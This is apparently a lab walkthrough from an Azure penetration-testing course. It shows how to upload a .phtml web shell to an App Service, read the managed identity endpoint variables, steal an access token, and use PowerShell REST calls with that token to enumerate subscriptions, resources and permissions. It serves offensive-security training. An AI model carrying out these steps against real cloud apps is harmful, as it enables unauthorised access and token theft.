# Abusing Identity Endpoint

We can upload .phtml files using the file upload functionality. Use the studentxshell.phtml from the Tools directory on your student VM (which is a super simple web shell)

After uploading the web shell, access it and pass the 'env' command to check if a managed identity is assigned to the app service. Look for environment variables IDENTITY\_HEADER and IDENTITY\_ENDPOINT in the output of https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

We can use a simple curl command to get the access token using the IDENTITY\_ENDPOINT AND IDENTITY\_HEADER. Let's upload another webshell studentxtoken.phtml for that. Access it by browsing to https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml:

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

We can use the access token and client ID from above with Az PowerShell. But Az PowerShell’s Get-AzRoleAssignment would not show us the permissions for the current token. It would show role assignments only to ObjectIDs (no way to get the ObjectID of the Manged Identity token that we have).

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

To resolve Object IDs to SignInName, we could request MS Graph tokens. While we can request both the tokes, for now, let's fall back to manual API calls for enumeration. Let's use the token with Azure REST API. We would need the subscription ID, use the code below to request it:

```powershell
$Token =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value 
```

List all resources accessible for the managed identity assigned to the app service. Note that the only difference is the URI

```
$Token =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value 

```

Let's see what actions are allowed using the below code:

```
$Token =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value

```

